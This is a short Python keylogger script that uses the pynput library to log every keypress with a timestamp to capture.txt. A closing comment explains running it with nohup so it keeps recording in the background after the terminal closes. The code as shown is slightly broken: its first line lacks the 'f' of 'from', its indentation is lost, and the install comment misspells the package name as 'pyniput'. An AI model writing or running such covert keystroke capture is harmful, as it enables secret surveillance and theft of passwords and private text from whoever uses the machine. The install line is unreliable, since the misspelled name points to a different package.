rom pynput.keyboard import Key, Listener # we need to install the pynput library (pip install pyniput)
import logging # allows the keystrokes recorded being saved into the file

logging.basicConfig(filename=("capture.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(key):
logging.info(str(key))

with Listener(on_press=on_press) as listener :
listener.join()


#nohup python3 keylogger.py & ( this enable the keylogger script to continue running at the background even when the terminal is closed)
